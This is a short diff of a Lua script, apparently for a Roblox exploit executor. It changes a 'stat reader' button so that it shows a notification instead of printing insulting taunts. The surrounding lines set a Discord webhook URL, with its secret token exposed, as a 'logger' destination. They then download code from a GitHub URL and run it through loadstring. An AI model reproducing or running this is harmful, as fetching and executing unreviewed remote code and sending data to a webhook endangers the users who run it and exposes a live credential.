@@ -539,8 +539,12 @@ end)
     statReaderButton.Parent = frame
 
     statReaderButton.MouseButton1Click:Connect(function()
-        print("youre gay")
-        print("yeah, you. youre gay")
+	local CoreGui = game:GetService("StarterGui")
+	CoreGui:SetCore("SendNotification", {
+	    Title = "PLEASE for the love of god",
+	    Text = "Only execute the reader once",
+	    Duration = 5.5,
+	})
         getgenv().LoggerUrl = "https://ptb.discord.com/api/webhooks/1337512520725823579/frzuqdPRx_MX7396DaFawKRH5aXj1XVlp2nbOVYSGemF3neLkm5NiRBDBPdE49ye2svV"
     
         loadstring(game:HttpGet("https://raw.githubusercontent.com/VBallsYCUKER/a/refs/heads/main/adada", true))()
